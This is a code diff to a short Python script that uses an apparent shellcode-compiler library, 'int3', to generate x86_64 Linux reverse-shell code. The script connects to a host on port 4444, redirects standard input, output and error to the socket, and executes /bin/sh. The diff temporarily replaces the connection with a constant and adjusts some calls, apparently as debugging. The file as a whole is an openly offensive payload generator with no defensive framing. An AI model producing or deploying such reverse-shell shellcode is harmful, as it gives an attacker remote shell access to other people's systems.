@@ -1,4 +1,4 @@
-from int3 import FormatStyle, LinuxCompiler
+from int3 import IrIntConstant, LinuxCompiler
 
 HOST = "0.0.0.0"
 PORT = 4444
@@ -7,16 +7,19 @@ PORT = 4444
 def main():
     cc = LinuxCompiler(arch="x86_64")
 
-    sock = cc.net_open_connection(ip_addr=HOST, port=PORT)
+    # XXX
+    # sock = cc.net_open_connection(ip_addr=HOST, port=PORT)
+    sock = IrIntConstant.i32(-1)
+
     with cc.if_else(sock < 0) as (then, otherwise):
         with then:
             for fd in range(3):
-                cc.dup2(sock, fd)
+                cc.sys_dup2(sock, fd)
             cc.sys_execve(b"/bin/sh")
         with otherwise:
             cc.sys_exit(0)
 
-    print(cc.compile(format=FormatStyle.Assembly))
+    print(cc.compile())
 
 
 if __name__ == "__main__":
